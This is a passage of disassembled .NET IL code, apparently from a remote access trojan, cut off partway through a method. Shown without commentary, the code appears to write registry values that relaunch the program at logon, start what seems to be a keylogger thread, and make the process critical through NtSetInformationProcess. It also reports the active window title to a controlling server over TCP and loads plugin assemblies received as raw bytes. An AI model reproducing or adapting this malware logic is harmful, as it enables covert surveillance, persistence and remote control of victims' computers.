    IL_00b7:  stloc.s    V_12
    IL_00b9:  ldloc.s    V_12
    IL_00bb:  brfalse.s  IL_010e

    .try
    {
      IL_00bd:  nop
      IL_00be:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00c3:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00c8:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00cd:  ldstr      "di"
      IL_00d2:  ldstr      "!"
      IL_00d7:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_00dc:  nop
      IL_00dd:  leave.s    IL_0101

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00df:  dup
      IL_00e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e5:  stloc.s    exception1
      IL_00e7:  nop
      IL_00e8:  ldloc.s    exception1
      IL_00ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ef:  nop
      IL_00f0:  ldloc.s    exception1
      IL_00f2:  stloc.s    exception
      IL_00f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00f9:  nop
      IL_00fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ff:  leave.s    IL_0101

    }  // end handler
    IL_0101:  nop
    IL_0102:  ldc.i4     0x1388
    IL_0107:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_010c:  nop
    IL_010d:  nop
    IL_010e:  nop
    IL_010f:  ldc.i4.0
    IL_0110:  stloc.0
    IL_0111:  ldc.i4.1
    IL_0112:  ldsfld     string j.OK::RG
    IL_0117:  ldloca.s   createdNew
    IL_0119:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_011e:  stsfld     object j.OK::MT
    IL_0123:  ldloc.0
    IL_0124:  ldc.i4.0
    IL_0125:  ceq
    IL_0127:  stloc.s    V_15
    IL_0129:  ldloc.s    V_15
    IL_012b:  brfalse.s  IL_0134

    IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0132:  nop
    IL_0133:  nop
    IL_0134:  nop
    IL_0135:  call       void j.OK::INS()
    IL_013a:  nop
    IL_013b:  ldsfld     bool j.OK::Idr
    IL_0140:  ldc.i4.0
    IL_0141:  ceq
    IL_0143:  stloc.s    V_16
    IL_0145:  ldloc.s    V_16
    IL_0147:  brfalse.s  IL_016d

    IL_0149:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_014e:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0153:  stsfld     string j.OK::EXE
    IL_0158:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_015d:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0162:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0167:  stsfld     string j.OK::DR
    IL_016c:  nop
    IL_016d:  nop
    IL_016e:  ldnull
    IL_016f:  ldftn      void j.OK::RC()
    IL_0175:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_017a:  ldc.i4.1
    IL_017b:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0180:  stloc.1
    IL_0181:  ldloc.1
    IL_0182:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0187:  nop
    .try
    {
      IL_0188:  nop
      IL_0189:  newobj     instance void j.kl::.ctor()
      IL_018e:  stsfld     class j.kl j.OK::kq
      IL_0193:  ldsfld     class j.kl j.OK::kq
      IL_0198:  ldftn      instance void j.kl::WRK()
      IL_019e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_01a3:  ldc.i4.1
      IL_01a4:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_01a9:  stloc.s    m
      IL_01ab:  ldloc.s    m
      IL_01ad:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_01b2:  nop
      IL_01b3:  leave.s    IL_01d7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b5:  dup
      IL_01b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bb:  stloc.s    exception8
      IL_01bd:  nop
      IL_01be:  ldloc.s    exception8
      IL_01c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c5:  nop
      IL_01c6:  ldloc.s    exception8
      IL_01c8:  stloc.s    exception2
      IL_01ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cf:  nop
      IL_01d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d5:  leave.s    IL_01d7

    }  // end handler
    IL_01d7:  nop
    IL_01d8:  ldc.i4.0
    IL_01d9:  stloc.2
    IL_01da:  ldstr      ""
    IL_01df:  stloc.3
    IL_01e0:  ldsfld     bool j.OK::BD
    IL_01e5:  stloc.s    V_20
    IL_01e7:  ldloc.s    V_20
    IL_01e9:  brfalse.s  IL_022b

    .try
    {
      IL_01eb:  nop
      IL_01ec:  ldnull
      IL_01ed:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_01f3:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_01f8:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_01fd:  nop
      IL_01fe:  ldc.i4.1
      IL_01ff:  call       void j.OK::pr(int32)
      IL_0204:  nop
      IL_0205:  leave.s    IL_0229

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0207:  dup
      IL_0208:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_020d:  stloc.s    exception9
      IL_020f:  nop
      IL_0210:  ldloc.s    exception9
      IL_0212:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0217:  nop
      IL_0218:  ldloc.s    exception9
      IL_021a:  stloc.s    exception3
      IL_021c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0221:  nop
      IL_0222:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0227:  leave.s    IL_0229

    }  // end handler
    IL_0229:  nop
    IL_022a:  nop
    IL_022b:  nop
    IL_022c:  br         IL_049a

    IL_0231:  ldc.i4     0x3e8
    IL_0236:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_023b:  nop
    IL_023c:  ldsfld     bool j.OK::Cn
    IL_0241:  ldc.i4.0
    IL_0242:  ceq
    IL_0244:  stloc.s    V_23
    IL_0246:  ldloc.s    V_23
    IL_0248:  brfalse.s  IL_0251

    IL_024a:  ldstr      ""
    IL_024f:  stloc.3
    IL_0250:  nop
    IL_0251:  nop
    IL_0252:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_0257:  nop
    .try
    {
      IL_0258:  nop
      IL_0259:  ldloc.2
      IL_025a:  ldc.i4.1
      IL_025b:  add.ovf
      IL_025c:  stloc.2
      IL_025d:  ldloc.2
      IL_025e:  ldc.i4.5
      IL_025f:  ceq
      IL_0261:  stloc.s    V_24
      IL_0263:  ldloc.s    V_24
      IL_0265:  brfalse.s  IL_02a3

      .try
      {
        IL_0267:  nop
        IL_0268:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_026d:  ldc.i4     0x400
        IL_0272:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_0277:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_027c:  nop
        IL_027d:  leave.s    IL_02a1

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_027f:  dup
        IL_0280:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0285:  stloc.s    exception10
        IL_0287:  nop
        IL_0288:  ldloc.s    exception10
        IL_028a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_028f:  nop
        IL_0290:  ldloc.s    exception10
        IL_0292:  stloc.s    exception4
        IL_0294:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0299:  nop
        IL_029a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_029f:  leave.s    IL_02a1

      }  // end handler
      IL_02a1:  nop
      IL_02a2:  nop
      IL_02a3:  nop
      IL_02a4:  ldloc.2
      IL_02a5:  ldc.i4.8
      IL_02a6:  clt
      IL_02a8:  ldc.i4.0
      IL_02a9:  ceq
      IL_02ab:  stloc.s    V_27
      IL_02ad:  ldloc.s    V_27
      IL_02af:  brfalse.s  IL_02e9

      IL_02b1:  ldc.i4.0
      IL_02b2:  stloc.2
      IL_02b3:  call       string j.OK::ACT()
      IL_02b8:  stloc.s    str2
      IL_02ba:  ldloc.3
      IL_02bb:  ldloc.s    str2
      IL_02bd:  ldc.i4.0
      IL_02be:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02c3:  ldc.i4.0
      IL_02c4:  cgt.un
      IL_02c6:  stloc.s    V_29
      IL_02c8:  ldloc.s    V_29
      IL_02ca:  brfalse.s  IL_02e7

      IL_02cc:  ldloc.s    str2
      IL_02ce:  stloc.3
      IL_02cf:  ldstr      "act"
      IL_02d4:  ldsfld     string j.OK::Y
      IL_02d9:  ldloc.s    str2
      IL_02db:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02e0:  call       bool j.OK::Send(string)
      IL_02e5:  pop
      IL_02e6:  nop
      IL_02e7:  nop
      IL_02e8:  nop
      IL_02e9:  nop
      IL_02ea:  ldsfld     bool j.OK::Isu
      IL_02ef:  stloc.s    V_30
      IL_02f1:  ldloc.s    V_30
      IL_02f3:  brfalse    IL_0473

      .try
      {
        IL_02f8:  nop
        IL_02f9:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02fe:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0303:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0308:  ldsfld     string j.OK::sf
        IL_030d:  ldstr      "\\"
        IL_0312:  ldsfld     string j.OK::RG
        IL_0317:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_031c:  ldstr      ""
        IL_0321:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0326:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_032b:  ldstr      "\""
        IL_0330:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0335:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_033a:  ldstr      "\" .."
        IL_033f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0344:  ldc.i4.0
        IL_0345:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_034a:  stloc.s    V_31
        IL_034c:  ldloc.s    V_31
        IL_034e:  brfalse.s  IL_038f

        IL_0350:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0355:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_035a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_035f:  ldsfld     string j.OK::sf
        IL_0364:  ldc.i4.1
        IL_0365:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_036a:  ldsfld     string j.OK::RG
        IL_036f:  ldstr      "\""
        IL_0374:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0379:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_037e:  ldstr      "\" .."
        IL_0383:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0388:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_038d:  nop
        IL_038e:  nop
        IL_038f:  nop
        IL_0390:  leave.s    IL_03b4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0392:  dup
        IL_0393:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0398:  stloc.s    exception11
        IL_039a:  nop
        IL_039b:  ldloc.s    exception11
        IL_039d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03a2:  nop
        IL_03a3:  ldloc.s    exception11
        IL_03a5:  stloc.s    exception5
        IL_03a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03ac:  nop
        IL_03ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03b2:  leave.s    IL_03b4

      }  // end handler
      IL_03b4:  nop
      .try
      {
        IL_03b5:  nop
        IL_03b6:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_03bb:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_03c0:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_03c5:  ldsfld     string j.OK::sf
        IL_03ca:  ldstr      "\\"
        IL_03cf:  ldsfld     string j.OK::RG
        IL_03d4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_03d9:  ldstr      ""
        IL_03de:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_03e3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_03e8:  ldstr      "\""
        IL_03ed:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_03f2:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_03f7:  ldstr      "\" .."
        IL_03fc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0401:  ldc.i4.0
        IL_0402:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0407:  stloc.s    V_34
        IL_0409:  ldloc.s    V_34
        IL_040b:  brfalse.s  IL_044c

        IL_040d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0412:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0417:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_041c:  ldsfld     string j.OK::sf
        IL_0421:  ldc.i4.1
        IL_0422:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0427:  ldsfld     string j.OK::RG
        IL_042c:  ldstr      "\""
        IL_0431:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0436:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_043b:  ldstr      "\" .."
        IL_0440:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0445:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_044a:  nop
        IL_044b:  nop
        IL_044c:  nop
        IL_044d:  leave.s    IL_0471

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_044f:  dup
        IL_0450:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0455:  stloc.s    exception12
        IL_0457:  nop
        IL_0458:  ldloc.s    exception12
        IL_045a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_045f:  nop
        IL_0460:  ldloc.s    exception12
        IL_0462:  stloc.s    exception6
        IL_0464:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0469:  nop
        IL_046a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_046f:  leave.s    IL_0471

      }  // end handler
      IL_0471:  nop
      IL_0472:  nop
      IL_0473:  nop
      IL_0474:  leave.s    IL_0498

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0476:  dup
      IL_0477:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_047c:  stloc.s    exception13
      IL_047e:  nop
      IL_047f:  ldloc.s    exception13
      IL_0481:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0486:  nop
      IL_0487:  ldloc.s    exception13
      IL_0489:  stloc.s    exception7
      IL_048b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0490:  nop
      IL_0491:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0496:  leave.s    IL_0498

    }  // end handler
    IL_0498:  nop
    IL_0499:  nop
    IL_049a:  ldc.i4.1
    IL_049b:  stloc.s    V_39
    IL_049d:  br         IL_0231
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       77 (0x4d)
    .maxstack  3
    .locals init ([0] string md5,
             [1] string str2,
             [2] uint8 num,
             [3] uint8[] V_3,
             [4] int32 V_4,
             [5] bool V_5)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  call       instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000c:  starg.s    B
    IL_000e:  ldstr      ""
    IL_0013:  stloc.1
    IL_0014:  ldarg.0
    IL_0015:  stloc.3
    IL_0016:  ldc.i4.0
    IL_0017:  stloc.s    V_4
    IL_0019:  br.s       IL_003a

    IL_001b:  ldloc.3
    IL_001c:  ldloc.s    V_4
    IL_001e:  ldelem.u1
    IL_001f:  stloc.2
    IL_0020:  ldloc.1
    IL_0021:  ldloca.s   num
    IL_0023:  ldstr      "x2"
    IL_0028:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0032:  stloc.1
    IL_0033:  nop
    IL_0034:  ldloc.s    V_4
    IL_0036:  ldc.i4.1
    IL_0037:  add.ovf
    IL_0038:  stloc.s    V_4
    IL_003a:  ldloc.s    V_4
    IL_003c:  ldloc.3
    IL_003d:  ldlen
    IL_003e:  conv.i4
    IL_003f:  clt
    IL_0041:  stloc.s    V_5
    IL_0043:  ldloc.s    V_5
    IL_0045:  brtrue.s   IL_001b

    IL_0047:  ldloc.1
    IL_0048:  stloc.0
    IL_0049:  br.s       IL_004b

    IL_004b:  ldloc.0
    IL_004c:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       136 (0x88)
    .maxstack  3
    .locals init ([0] object Plugin,
             [1] class [mscorlib]System.Reflection.Module Module,
             [2] class [mscorlib]System.Reflection.Module[] V_2,
             [3] int32 V_3,
             [4] class [mscorlib]System.Type 'type',
             [5] class [mscorlib]System.Type[] V_5,
             [6] int32 V_6,
             [7] bool V_7,
             [8] bool V_8,
             [9] bool V_9)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0007:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000c:  stloc.2
    IL_000d:  ldc.i4.0
    IL_000e:  stloc.3
    IL_000f:  br.s       IL_0076

    IL_0011:  ldloc.2
    IL_0012:  ldloc.3
    IL_0013:  ldelem.ref
    IL_0014:  stloc.1
    IL_0015:  ldloc.1
    IL_0016:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001b:  stloc.s    V_5
    IL_001d:  ldc.i4.0
    IL_001e:  stloc.s    V_6
    IL_0020:  br.s       IL_0063

    IL_0022:  ldloc.s    V_5
    IL_0024:  ldloc.s    V_6
    IL_0026:  ldelem.ref
    IL_0027:  stloc.s    'type'
    IL_0029:  ldloc.s    'type'
    IL_002b:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0030:  ldstr      "."
    IL_0035:  ldarg.1
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003b:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_0040:  stloc.s    V_7
    IL_0042:  ldloc.s    V_7
    IL_0044:  brfalse.s  IL_005b

    IL_0046:  ldloc.1
    IL_0047:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_004c:  ldloc.s    'type'
    IL_004e:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0053:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0058:  stloc.0
    IL_0059:  br.s       IL_0086

    IL_005b:  nop
    IL_005c:  nop
    IL_005d:  ldloc.s    V_6
    IL_005f:  ldc.i4.1
    IL_0060:  add.ovf
    IL_0061:  stloc.s    V_6
    IL_0063:  ldloc.s    V_6
    IL_0065:  ldloc.s    V_5
    IL_0067:  ldlen
    IL_0068:  conv.i4
    IL_0069:  clt
    IL_006b:  stloc.s    V_8
    IL_006d:  ldloc.s    V_8
    IL_006f:  brtrue.s   IL_0022

    IL_0071:  nop
    IL_0072:  ldloc.3
    IL_0073:  ldc.i4.1
    IL_0074:  add.ovf
    IL_0075:  stloc.3
    IL_0076:  ldloc.3
    IL_0077:  ldloc.2
    IL_0078:  ldlen
    IL_0079:  conv.i4
    IL_007a:  clt
    IL_007c:  stloc.s    V_9
    IL_007e:  ldloc.s    V_9
    IL_0080:  brtrue.s   IL_0011

    IL_0082:  ldnull
    IL_0083:  stloc.0
    IL_0084:  br.s       IL_0086

    IL_0086:  ldloc.0
    IL_0087:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       57 (0x39)
    .maxstack  4
    .locals init ([0] class [mscorlib]System.Exception exception1,
             [1] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0007:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000c:  ldc.i4.s   29
      IL_000e:  ldarga.s   i
      IL_0010:  ldc.i4.4
      IL_0011:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0016:  pop
      IL_0017:  leave.s    IL_0037

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  dup
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001f:  stloc.0
      IL_0020:  nop
      IL_0021:  ldloc.0
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0027:  nop
      IL_0028:  ldloc.0
      IL_0029:  stloc.1
      IL_002a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002f:  nop
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0035:  leave.s    IL_0037

    }  // end handler
    IL_0037:  nop
    IL_0038:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       722 (0x2d2)
    .maxstack  8
    .locals init ([0] bool V_0,
             [1] int64 num,
             [2] int32 num2,
             [3] bool V_3,
             [4] bool V_4,
             [5] bool V_5,
             [6] bool V_6,
             [7] int64 num5,
             [8] int32 count,
             [9] bool V_9,
             [10] string str,
             [11] int32 charCode,
             [12] bool V_12,
             [13] bool V_13,
             [14] char V_14,
             [15] bool V_15,
             [16] bool V_16,
             [17] bool V_17,
             [18] class [mscorlib]System.Threading.Thread thread,
             [19] class [mscorlib]System.Exception exception1,
             [20] class [mscorlib]System.Exception exception,
             [21] bool V_21,
             [22] class [mscorlib]System.Exception exception3,
             [23] class [mscorlib]System.Exception exception2,
             [24] bool V_24)
    IL_0000:  nop
    IL_0001:  nop
    IL_0002:  ldstr      ""
    IL_0007:  stsfld     string j.OK::lastcap
    IL_000c:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_0011:  ldnull
    IL_0012:  cgt.un
    IL_0014:  stloc.0
    IL_0015:  ldloc.0
    IL_0016:  brfalse    IL_0252

    IL_001b:  ldc.i4.m1
    IL_001c:  conv.i8
    IL_001d:  stloc.1
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.2
    .try
    {
      IL_0020:  nop
      IL_0021:  nop
      IL_0022:  ldloc.2
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.2
      IL_0026:  ldloc.2
      IL_0027:  ldc.i4.s   10
      IL_0029:  ceq
      IL_002b:  stloc.3
      IL_002c:  ldloc.3
      IL_002d:  brfalse.s  IL_0039

      IL_002f:  ldc.i4.0
      IL_0030:  stloc.2
      IL_0031:  ldc.i4.1
      IL_0032:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0037:  nop
      IL_0038:  nop
      IL_0039:  nop
      IL_003a:  ldsfld     bool j.OK::Cn
      IL_003f:  ldc.i4.0
      IL_0040:  ceq
      IL_0042:  stloc.s    V_4
      IL_0044:  ldloc.s    V_4
      IL_0046:  brfalse.s  IL_004d

      IL_0048:  leave      IL_0253

      IL_004d:  nop
      IL_004e:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0053:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0058:  ldc.i4.1
      IL_0059:  clt
      IL_005b:  stloc.s    V_5
      IL_005d:  ldloc.s    V_5
      IL_005f:  brfalse.s  IL_0074

      IL_0061:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0066:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_006b:  ldc.i4.m1
